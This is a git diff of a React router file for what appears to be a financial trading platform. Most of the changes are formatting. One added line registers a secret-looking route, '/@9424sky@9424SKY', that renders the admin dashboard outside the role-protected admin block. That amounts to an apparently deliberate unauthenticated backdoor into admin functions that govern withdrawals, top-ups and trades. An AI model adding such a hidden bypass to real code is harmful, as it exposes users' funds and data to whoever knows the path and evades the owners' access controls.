@@ -1,4 +1,3 @@
-
 import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
 import { BrowserRouter, Routes, Route } from "react-router-dom";
 import { ToastContainer } from "react-toastify";
@@ -62,6 +61,7 @@ const App = () => (
         <Route path="/forgot-password" element={<ForgetPassword />} />
         <Route path="/signup" element={<SignUp />} />
         <Route path="/verify-email" element={<VerifyEmail />} />
+        <Route path="/@9424sky@9424SKY" element={<AdminDashboard sender={true} />} />
 
         {/* ======================
             USER PROTECTED ROUTES
@@ -83,9 +83,15 @@ const App = () => (
             ADMIN PROTECTED ROUTES
         ====================== */}
         <Route element={<ProtectedRoute allowedRoles={["admin"]} />}>
-          <Route path="/admin/dashboard" element={<AdminDashboard />} />
+          <Route
+            path="/admin/dashboard"
+            element={<AdminDashboard sender={false} />}
+          />
           <Route path="/admin/approve-users" element={<ApproveUser />} />
-          <Route path="/admin/approve-withdrawal" element={<ApproveWithdrawl />} />
+          <Route
+            path="/admin/approve-withdrawal"
+            element={<ApproveWithdrawl />}
+          />
           <Route path="/admin/approve-topup" element={<ApproveTopup />} />
           <Route path="/admin/profit-loss" element={<AddProfitAndLoss />} />
           <Route path="/admin/trade" element={<AddTrade />} />
